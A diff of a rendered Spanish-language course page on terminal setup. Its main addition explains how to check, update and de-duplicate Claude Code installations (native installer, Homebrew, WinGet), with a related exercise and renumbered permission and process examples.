@@ -61,7 +61,26 @@ div.sourceCode
 @media screen {
 pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
 }
-</style>
+/* CSS for citations */
+div.csl-bib-body { }
+div.csl-entry {
+  clear: both;
+}
+.hanging-indent div.csl-entry {
+  margin-left:2em;
+  text-indent:-2em;
+}
+div.csl-left-margin {
+  min-width:2em;
+  float:left;
+}
+div.csl-right-inline {
+  margin-left:2em;
+  padding-left:1em;
+}
+div.csl-indent {
+  margin-left: 2em;
+}</style>
 
 
 <script src="../site_libs/quarto-nav/quarto-nav.js"></script>
@@ -81,7 +100,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <link href="../site_libs/quarto-html/quarto-syntax-highlighting-bf27225e3a48a9273f3daa8f8e829971.css" rel="stylesheet" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-a95d84cf3d0d9b3c0ccde713ddd8fed3.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<link href="../site_libs/bootstrap/bootstrap-a4cfe87370dc173d9ea2018935ed1a4e.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "location": "navbar",
   "copy-button": false,
@@ -143,7 +162,7 @@ window.Quarto = {
 <link rel="stylesheet" href="../styles.css">
 </head>
 
-<body class="nav-sidebar docked nav-fixed quarto-light">
+<body class="nav-sidebar docked nav-fixed slimcontent quarto-light">
 
 <div id="quarto-search-results"></div>
   <header id="quarto-header" class="headroom fixed-top">
@@ -171,6 +190,10 @@ window.Quarto = {
   <li class="nav-item">
     <a class="nav-link" href="../hoja-consulta.html"> 
 <span class="menu-text">Hoja de consulta</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../actualizaciones.html"> 
+<span class="menu-text">Actualizaciones</span></a>
   </li>  
 </ul>
             <ul class="navbar-nav navbar-nav-scroll ms-auto">
@@ -340,11 +363,13 @@ window.Quarto = {
   <li><a href="#ejercicios" id="toc-ejercicios" class="nav-link" data-scroll-target="#ejercicios">Ejercicios</a></li>
   <li><a href="#la-doy-por-superada-si" id="toc-la-doy-por-superada-si" class="nav-link" data-scroll-target="#la-doy-por-superada-si">La doy por superada si…</a></li>
   <li><a href="#referencias-de-esta-unidad" id="toc-referencias-de-esta-unidad" class="nav-link" data-scroll-target="#referencias-de-esta-unidad">Referencias de esta unidad</a></li>
+  <li><a href="#referencias-unidad" id="toc-referencias-unidad" class="nav-link" data-scroll-target="#referencias-unidad">Referencias</a></li>
+  <li><a href="#bibliography" id="toc-bibliography" class="nav-link" data-scroll-target="#bibliography">Referencias</a></li>
   </ul>
 <div class="toc-actions"><ul><li><a href="https://github.com/me1catrr/claudedo/edit/main/c2-terminal/index.qmd" class="toc-action"><i class="bi bi-github"></i>Editar esta página</a></li><li><a href="https://github.com/me1catrr/claudedo/issues/new" class="toc-action"><i class="bi empty"></i>Informar sobre problema</a></li></ul></div><div class="quarto-other-links"><h2>Otros Enlaces</h2><ul><li><a href="slides.html"><i class="bi bi-link-45deg"></i>Diapositivas</a></li></ul></div></nav>
     </div>
 <!-- main -->
-<main class="content" id="quarto-document-content">
+<main class="content page-columns page-full" id="quarto-document-content">
 
 <header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../c2-terminal/index.html">Aplicado</a></li><li class="breadcrumb-item"><a href="../c2-terminal/index.html">C2 · Preparación del entorno y terminal</a></li></ol></nav>
 <div class="quarto-title">
@@ -367,7 +392,7 @@ window.Quarto = {
 
 
 <div class="version-unidad version-pend" role="note">
-<p>Versión 0.2.0 · editada el 23/10/2026 · comprobada el 23/10/2026 · Claude Code 2.1.309 (doc.) · pendiente de revisión</p>
+<p>Versión 0.3.0 · editada el 25/11/2026 · comprobada el 25/11/2026 · Claude Code 2.1.332 (doc.) · pendiente de revisión</p>
 </div>
 <p><img src="fig/portada.svg" class="portada img-fluid" alt="Esquema de una terminal con un indicador de órdenes, una orden y su salida, y debajo tres cuadros: archivos, procesos y permisos"></p>
 <section id="objetivos-y-prerrequisitos" class="level2">
@@ -418,7 +443,7 @@ window.Quarto = {
 <li><strong>C2.11</strong> Copias y hashes, redes, tareas programadas, logs y diagnóstico; lista de preparación</li>
 </ul>
 </section>
-<section id="teoría-breve" class="level2">
+<section id="teoría-breve" class="level2 page-columns page-full">
 <h2 class="anchored" data-anchor-id="teoría-breve">Teoría breve</h2>
 <section id="c2-1" class="level3">
 <h3 class="anchored" data-anchor-id="c2-1">C2.1 Terminal, shell y sistema operativo: Zsh y PowerShell, ayuda e historial</h3>
@@ -459,7 +484,7 @@ window.Quarto = {
 </tr>
 </tbody>
 </table>
-<p>Se puede cambiar de shell sin cambiar de terminal, y la misma shell funciona en distintas terminales. La diferencia práctica más importante entre las dos shells de este curso es <strong>qué circula por las tuberías</strong>: Zsh pasa <strong>texto</strong>; PowerShell pasa <strong>objetos</strong> con propiedades (nombre, tamaño, fecha…). Por eso muchas órdenes de PowerShell no necesitan trocear texto con <code>cut</code> o <code>awk</code>.</p>
+<p>Se puede cambiar de shell sin cambiar de terminal, y la misma shell funciona en distintas terminales. Además de las del sistema hay otras aplicaciones de terminal, como Warp: por dentro ejecutan la misma Zsh o PowerShell, así que todo lo que se enseña en esta unidad vale igual en ellas. La diferencia práctica más importante entre las dos shells de este curso es <strong>qué circula por las tuberías</strong>: Zsh pasa <strong>texto</strong>; PowerShell pasa <strong>objetos</strong> con propiedades (nombre, tamaño, fecha…). Por eso muchas órdenes de PowerShell no necesitan trocear texto con <code>cut</code> o <code>awk</code>.</p>
 <table class="caption-top table">
 <colgroup>
 <col style="width: 33%">
@@ -965,9 +990,9 @@ window.Quarto = {
 </section>
 <section id="c2-8" class="level3">
 <h3 class="anchored" data-anchor-id="c2-8">C2.8 Editor de código, VS Code y alternativas</h3>
-<p>Un <strong>editor de código</strong> resalta la sintaxis, completa, navega por el proyecto y se integra con Git y con la terminal. <strong>Visual Studio Code</strong> es la opción habitual: gratuito, con terminal integrada (en la que corren Zsh o PowerShell) y extensiones para Julia, Python y Quarto. Hay alternativas (editores ligeros como Zed o Sublime Text; los IDE de JetBrains) y <strong>Claude Code funciona también dentro de VS Code</strong> (se verá en C4). Elige uno, aprende sus atajos básicos y mantén la terminal integrada abierta en la carpeta del proyecto. No dependas de funciones de pago para seguir el curso.</p>
+<p>Un <strong>editor de código</strong> resalta la sintaxis, completa, navega por el proyecto y se integra con Git y con la terminal. <strong>Visual Studio Code</strong> es la opción habitual: gratuito, con terminal integrada (en la que corren Zsh o PowerShell) y extensiones para Julia, Python y Quarto. Hay alternativas (editores ligeros como Zed o Sublime Text; los IDE de JetBrains) y <strong>Claude Code funciona también dentro de VS Code</strong> (se verá en C4). Hay además editores <strong>derivados de VS Code</strong>, como Cursor: la documentación de la extensión de Claude Code ofrece un enlace de instalación específico para Cursor e indica que en otros derivados se instala desde el registro Open VSX; en un editor que no admita la extensión basta con ejecutar <code>claude</code> en su terminal integrada (<a href="https://code.claude.com/docs/en/vs-code">documentación de Claude Code para VS Code</a>, consultada el 25-11-2026). El curso no lo ha probado en Cursor. Elige uno, aprende sus atajos básicos y mantén la terminal integrada abierta en la carpeta del proyecto. No dependas de funciones de pago para seguir el curso.</p>
 </section>
-<section id="c2-9" class="level3">
+<section id="c2-9" class="level3 page-columns page-full">
 <h3 class="anchored" data-anchor-id="c2-9">C2.9 Quarto, Git, Claude Code y Docker: instalación y comprobación de versiones</h3>
 <p>Para trabajar con este curso necesitas cuatro herramientas más. Instálalas con el gestor de tu sistema y comprueba cada una con su <code>--version</code>. Las versiones con las que se ha comprobado el curso son un punto de partida, no una exigencia.</p>
 <table class="caption-top table">
@@ -982,7 +1007,7 @@ window.Quarto = {
 <th>Herramienta</th>
 <th>Para qué</th>
 <th>Comprobación</th>
-<th>Versión de referencia (23-10-2026)</th>
+<th>Versión de referencia</th>
 </tr>
 </thead>
 <tbody>
@@ -990,19 +1015,19 @@ window.Quarto = {
 <td><strong>Quarto</strong></td>
 <td>Documentos, informes y esta web</td>
 <td><code>quarto --version</code></td>
-<td>1.10.19</td>
+<td>1.10.19 (23-10-2026)</td>
 </tr>
 <tr class="even">
 <td><strong>Git</strong></td>
 <td>Control de versiones (C3)</td>
 <td><code>git --version</code></td>
-<td>2.55.0</td>
+<td>2.55.0 (23-10-2026)</td>
 </tr>
 <tr class="odd">
 <td><strong>Claude Code</strong></td>
 <td>Agente en la terminal (C4)</td>
 <td><code>claude --version</code></td>
-<td>2.1.306 (documentada: 2.1.309)</td>
+<td>2.1.332, la última publicada el 25-11-2026; las órdenes de esta revisión se ejecutaron con 2.1.330</td>
 </tr>
 <tr class="even">
 <td><strong>Docker</strong></td>
@@ -1012,7 +1037,71 @@ window.Quarto = {
 </tr>
 </tbody>
 </table>
-<p>La instalación de Claude Code, la autenticación y los permisos se explican en C4; no instales nada de esa unidad sin leerla. <code>claude doctor</code> (en la terminal) hace un diagnóstico de solo lectura de tu instalación. <strong>Docker</strong> es opcional y solo hace falta en C8: no lo instales todavía si no lo vas a usar.</p>
+<p>La instalación de Claude Code, la autenticación y los permisos se explican en C4; no instales nada de esa unidad sin leerla. <strong>Docker</strong> es opcional y solo hace falta en C8: no lo instales todavía si no lo vas a usar.</p>
+<p><strong>Qué versión de Claude Code tienes y cómo actualizarla.</strong> Claude Code publica versiones nuevas varias veces por semana, así que la cifra de la tabla envejece enseguida. Lo útil es saber cuál tienes y cómo ponerla al día, y eso depende de <strong>cómo la instalaste</strong> <span class="citation" data-cites="anthropic-cli">(<a href="#ref-anthropic-cli" role="doc-biblioref"><em>CLI reference</em> 2026</a>)</span>:</p>
+<div class="no-row-height column-margin column-container"></div><div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> <span class="at">--version</span>     <span class="co"># ✔ macOS: imprime, por ejemplo, «2.1.330 (Claude Code)»</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> update        <span class="co"># instala la última versión si la hay (no ejecutado aquí: descarga de la red)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<table class="caption-top table">
+<colgroup>
+<col style="width: 33%">
+<col style="width: 33%">
+<col style="width: 33%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>Instalación</th>
+<th>¿Se actualiza sola?</th>
+<th>Cómo se actualiza a mano</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Instalador oficial (nativa; en macOS, <code>~/.local/bin/claude</code>)</td>
+<td>Sí, en segundo plano; la versión nueva se usa al volver a arrancar</td>
+<td><code>claude update</code></td>
+</tr>
+<tr class="even">
+<td>Homebrew (<code>brew install --cask claude-code</code>)</td>
+<td>No</td>
+<td><code>brew upgrade claude-code</code></td>
+</tr>
+<tr class="odd">
+<td>WinGet † (<code>winget install Anthropic.ClaudeCode</code>)</td>
+<td>No</td>
+<td><code>winget upgrade Anthropic.ClaudeCode</code></td>
+</tr>
+</tbody>
+</table>
+<p>Según la documentación de instalación (consultada el 25-11-2026), el <em>cask</em> <code>claude-code</code> de Homebrew sigue el canal <strong>estable</strong>, que suele ir alrededor de una semana por detrás (el <em>cask</em> <code>claude-code@latest</code> sigue el canal más reciente); por eso, el mismo día, dos personas pueden tener versiones distintas sin que ninguna esté «mal». En una instalación hecha con un gestor de paquetes, <code>claude update</code> no la sustituye: la ayuda de <code>claude</code> (2.1.330) indica que esas instalaciones se actualizan con su gestor.</p>
+<p>Dos órdenes más, útiles cuando algo no funciona:</p>
+<ul>
+<li><strong><code>claude doctor</code></strong> hace un diagnóstico de <strong>solo lectura</strong> de la instalación y de los ficheros de configuración, sin abrir una sesión, y sugiere cómo corregir lo que encuentra <span class="citation" data-cites="anthropic-cli">(<a href="#ref-anthropic-cli" role="doc-biblioref"><em>CLI reference</em> 2026</a>)</span>. Según el registro de cambios, desde la versión 2.1.331 incluye además una <strong>prueba de conectividad con la API</strong>, que ayuda a distinguir un problema de red o de <em>proxy</em> de uno de instalación <span class="citation" data-cites="anthropic-changelog">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>. No se ha comprobado en el curso (la revisión se hizo con 2.1.330).</li>
+<li><strong><code>claude auth status</code></strong> informa de si has iniciado sesión. Su salida es JSON por defecto; con <code>--text</code> la da en texto legible (opciones comprobadas en la ayuda de 2.1.330). Según el registro de cambios, desde la 2.1.318 dice también <strong>cuándo caduca</strong> el inicio de sesión guardado (campo <code>loginExpiresAt</code>) <span class="citation" data-cites="anthropic-changelog">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>, lo que te permite prever cuándo tendrás que volver a entrar. No se ha ejecutado en el curso. Puede incluir datos de tu cuenta: no pegues su salida en foros ni en <em>issues</em> públicos.</li>
+</ul>
+<div class="no-row-height column-margin column-container"><div id="ref-anthropic-cli" class="csl-entry" role="listitem">
+<em>CLI reference</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 25-11-2026. <a href="https://code.claude.com/docs/en/cli-reference">https://code.claude.com/docs/en/cli-reference</a>.
+</div><div id="ref-anthropic-changelog" class="csl-entry" role="listitem">
+<em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic) y CHANGELOG.md de anthropics/claude-code, consultados el 25-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.
+</div></div><div class="callout callout-style-default callout-warning callout-titled" title="Dos instalaciones a la vez: un caso frecuente">
+<div class="callout-header d-flex align-content-center">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+<span class="screen-reader-only">Advertencia</span>Dos instalaciones a la vez: un caso frecuente
+</div>
+</div>
+<div class="callout-body-container callout-body">
+<p>Si instalas Claude Code dos veces (por ejemplo, con el instalador oficial y con Homebrew), las dos quedan en disco y la shell ejecuta <strong>la primera que encuentra en PATH</strong> (C2.5). La otra se queda desactualizada sin que lo notes, y <code>claude update</code> puede actualizar una mientras tú usas la otra. Un ejemplo (salida ilustrativa; las versiones son inventadas):</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="bu">which</span> <span class="at">-a</span> claude                       <span class="co"># ✔ macOS: todas las que hay en PATH, por orden</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="co"># /Users/ana/.local/bin/claude        ← nativa: es la que se ejecuta</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="co"># /opt/homebrew/bin/claude            ← Homebrew</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="co"># /opt/homebrew/bin/claude            ← repetida: esa carpeta está dos veces en PATH</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.local/bin/claude</span> <span class="at">--version</span>         <span class="co"># 2.1.320 (Claude Code)</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/opt/homebrew/bin/claude</span> <span class="at">--version</span>    <span class="co"># 2.1.300 (Claude Code)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p>En Windows, el equivalente es <code>where.exe claude</code> †. Cómo se resuelve: <strong>elige una</strong> instalación, desinstala la otra con su propio método (<code>brew uninstall --cask claude-code</code> para la de Homebrew), abre una terminal nueva y comprueba con <code>which -a claude</code> que solo queda una. Una ruta repetida es inofensiva, pero delata una línea duplicada en <code>~/.zshrc</code>. Y una tercera fuente de confusión: la aplicación de escritorio y la extensión de VS Code pueden llevar su propia copia de Claude Code, cuya versión (la que muestra <code>/status</code> dentro de la sesión) no tiene por qué coincidir con la de <code>claude --version</code> en la terminal; en ese mismo ordenador, la sesión de escritorio usaba la 2.1.330. La documentación trata este caso en <a href="https://code.claude.com/docs/en/troubleshoot-install#check-for-conflicting-installations"><em>Check for conflicting installations</em></a> (consultada el 25-11-2026).</p>
+</div>
+</div>
 <p><strong>Pon a prueba lo anterior.</strong></p>
 <div id="c2-9-versiones" class="ejercicio" data-tipo="abierta">
 <p>Ejecuta <code>--version</code> de las cuatro herramientas y anota los resultados en una tabla. ¿Cuál falta o está desactualizada respecto a la de referencia?</p>
@@ -1020,8 +1109,24 @@ window.Quarto = {
 <ul>
 <li>Tengo las versiones anotadas, no solo «instalado».</li>
 <li>Sé decir qué falta y con qué gestor (brew o winget) la instalaría.</li>
+<li>Sé cómo instalé Claude Code y, por tanto, cómo se actualiza.</li>
+<li>He comprobado con <code>which -a claude</code> (o <code>where.exe claude</code>) que solo hay una instalación, o sé cuál se está usando.</li>
 <li>No he ejecutado ninguna instalación que no entienda.</li>
 </ul>
+</div>
+</div>
+<div id="c2-9-dos-claude" class="ejercicio" data-tipo="opcion" data-respuesta="b">
+<p><code>which -a claude</code> imprime dos rutas: primero <code>~/.local/bin/claude</code> y después <code>/opt/homebrew/bin/claude</code>. Ejecutas <code>brew upgrade claude-code</code> y luego <code>claude --version</code>. ¿Qué versión ves?</p>
+<div class="opciones">
+<ul>
+<li>La de Homebrew recién actualizada, porque es la última que has tocado.</li>
+<li>La de <code>~/.local/bin/claude</code>, porque es la primera de PATH; la actualización de Homebrew no le afecta.</li>
+<li>Las dos a la vez, una en cada línea.</li>
+<li>Ninguna: con dos instalaciones, <code>claude</code> deja de funcionar.</li>
+</ul>
+</div>
+<div class="solucion">
+<p>La shell ejecuta la <strong>primera</strong> coincidencia de PATH, la nativa de <code>~/.local/bin</code>. Has actualizado la otra. Elige una instalación, desinstala la otra y vuelve a comprobarlo con <code>which -a claude</code>.</p>
 </div>
 </div>
 </section>
@@ -1031,14 +1136,14 @@ window.Quarto = {
 <h4 class="anchored" data-anchor-id="usuarios-permisos-y-mínimo-privilegio">Usuarios, permisos y mínimo privilegio</h4>
 <p>Cada fichero tiene un <strong>propietario</strong> y unos permisos. El <strong>principio de mínimo privilegio</strong> dice que un usuario, un programa o un agente debe tener solo los permisos que su tarea necesita: leer una carpeta, no todo el disco.</p>
 <p><strong>macOS (POSIX).</strong> Cada fichero tiene permisos de <strong>lectura (r)</strong>, <strong>escritura (w)</strong> y <strong>ejecución (x)</strong> para <strong>usuario (u)</strong>, <strong>grupo (g)</strong> y <strong>otros (o)</strong>. <code>ls -l</code> los muestra: <code>-rwxr-xr--</code> significa que el propietario puede leer, escribir y ejecutar; el grupo, leer y ejecutar; los demás, solo leer. En octal, <code>r=4, w=2, x=1</code>: <code>rwxr-xr--</code> es <strong>754</strong>.</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-l</span> scripts/ejecutar.zsh          <span class="co"># ✔ -rwxr-xr-x   (755)</span></span>
-<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> u+x scripts/ejecutar.zsh      <span class="co"># ✔ añade ejecución al propietario</span></span>
-<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 644 datos/aceleracion.csv     <span class="co"># ✔ rw-r--r--</span></span>
-<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="bu">stat</span> <span class="at">-f</span> <span class="st">"%Sp %Su"</span> scripts/ejecutar.zsh   <span class="co"># ✔ muestra el modo y el propietario</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-l</span> scripts/ejecutar.zsh          <span class="co"># ✔ -rwxr-xr-x   (755)</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> u+x scripts/ejecutar.zsh      <span class="co"># ✔ añade ejecución al propietario</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> 644 datos/aceleracion.csv     <span class="co"># ✔ rw-r--r--</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="bu">stat</span> <span class="at">-f</span> <span class="st">"%Sp %Su"</span> scripts/ejecutar.zsh   <span class="co"># ✔ muestra el modo y el propietario</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>macOS añade a POSIX unas <strong>listas de control de acceso (ACL)</strong> más finas (<code>ls -le</code>, <code>chmod +a</code>) y protecciones propias del sistema (SIP, permisos de privacidad por aplicación) que no se controlan con <code>chmod</code>.</p>
 <p><strong>Windows (ACL).</strong> Windows no usa el trío usuario/grupo/otros: cada objeto tiene una <strong>lista de control de acceso</strong> con entradas para cada usuario o grupo (leer, modificar, control total, heredado de la carpeta padre…). Se consulta y cambia con:</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Acl</span> <span class="op">.</span>\datos <span class="op">|</span> <span class="fu">Format-List</span>       <span class="co"># † lista las entradas de acceso</span></span>
-<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>icacls <span class="op">.</span>\datos                      <span class="co"># † herramienta clásica de línea de órdenes</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Acl</span> <span class="op">.</span>\datos <span class="op">|</span> <span class="fu">Format-List</span>       <span class="co"># † lista las entradas de acceso</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>icacls <span class="op">.</span>\datos                      <span class="co"># † herramienta clásica de línea de órdenes</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Comparación.</strong></p>
 <table class="caption-top table">
 <colgroup>
@@ -1085,16 +1190,16 @@ window.Quarto = {
 <ul class="nav nav-tabs" role="tablist"><li class="nav-item" role="presentation"><a class="nav-link active" id="tabset-6-1-tab" data-bs-toggle="tab" data-bs-target="#tabset-6-1" role="tab" aria-controls="tabset-6-1" aria-selected="true" href="">macOS (Zsh)</a></li><li class="nav-item" role="presentation"><a class="nav-link" id="tabset-6-2-tab" data-bs-toggle="tab" data-bs-target="#tabset-6-2" role="tab" aria-controls="tabset-6-2" aria-selected="false" href="">Windows (PowerShell) ✔ PS7</a></li></ul>
 <div class="tab-content">
 <div id="tabset-6-1" class="tab-pane active" role="tabpanel" aria-labelledby="tabset-6-1-tab">
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sleep</span> 300 <span class="kw">&amp;</span>                  <span class="co"># ✔ segundo plano; la shell imprime el PID</span></span>
-<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> <span class="at">-p</span> <span class="va">$!</span> <span class="at">-o</span> pid,comm         <span class="co"># sintaxis estándar BSD (no ejecutada en el entorno de redacción)</span></span>
-<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="bu">kill</span> <span class="at">-TERM</span> <span class="va">$!</span>                <span class="co"># ✔ terminación controlada; el código de salida del proceso es 143 (128+15)</span></span>
-<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">top</span> <span class="at">-o</span> cpu                   <span class="co"># consumo de recursos (interactivo; q para salir)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb20"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sleep</span> 300 <span class="kw">&amp;</span>                  <span class="co"># ✔ segundo plano; la shell imprime el PID</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> <span class="at">-p</span> <span class="va">$!</span> <span class="at">-o</span> pid,comm         <span class="co"># sintaxis estándar BSD (no ejecutada en el entorno de redacción)</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="bu">kill</span> <span class="at">-TERM</span> <span class="va">$!</span>                <span class="co"># ✔ terminación controlada; el código de salida del proceso es 143 (128+15)</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="ex">top</span> <span class="at">-o</span> cpu                   <span class="co"># consumo de recursos (interactivo; q para salir)</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </div>
 <div id="tabset-6-2" class="tab-pane" role="tabpanel" aria-labelledby="tabset-6-2-tab">
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="va">$p</span> <span class="op">=</span> <span class="fu">Start-Process</span> <span class="fu">sleep</span> <span class="op">-</span>ArgumentList <span class="dv">300</span> <span class="op">-</span>PassThru    <span class="co"># en Windows, pon aquí tu programa (p. ej. notepad)</span></span>
-<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                                   <span class="co"># el PID</span></span>
-<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Process</span> <span class="op">-</span>Id <span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                   <span class="co"># consumo de CPU y memoria</span></span>
-<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="fu">Stop-Process</span> <span class="op">-</span>Id <span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                  <span class="co"># pide terminar el proceso</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb21"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="va">$p</span> <span class="op">=</span> <span class="fu">Start-Process</span> <span class="fu">sleep</span> <span class="op">-</span>ArgumentList <span class="dv">300</span> <span class="op">-</span>PassThru    <span class="co"># en Windows, pon aquí tu programa (p. ej. notepad)</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                                   <span class="co"># el PID</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Process</span> <span class="op">-</span>Id <span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                   <span class="co"># consumo de CPU y memoria</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="fu">Stop-Process</span> <span class="op">-</span>Id <span class="va">$p</span><span class="op">.</span><span class="fu">Id</span>                                  <span class="co"># pide terminar el proceso</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </div>
 </div>
 </div>
@@ -1108,15 +1213,15 @@ window.Quarto = {
 <li><strong>Parámetros.</strong> <code>$1</code>, <code>$2</code>… en Zsh (o <code>${1:-valor}</code> con valor por defecto); <code>param([string]$Entrada)</code> en PowerShell.</li>
 <li><strong>Control de errores.</strong> Comprueba lo que puede fallar (¿existe el fichero?, ¿terminó bien la orden?) y deja un <strong>registro</strong> (log).</li>
 </ol>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb20"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ✔ macOS: condiciones, bucle, función y código de salida</span></span>
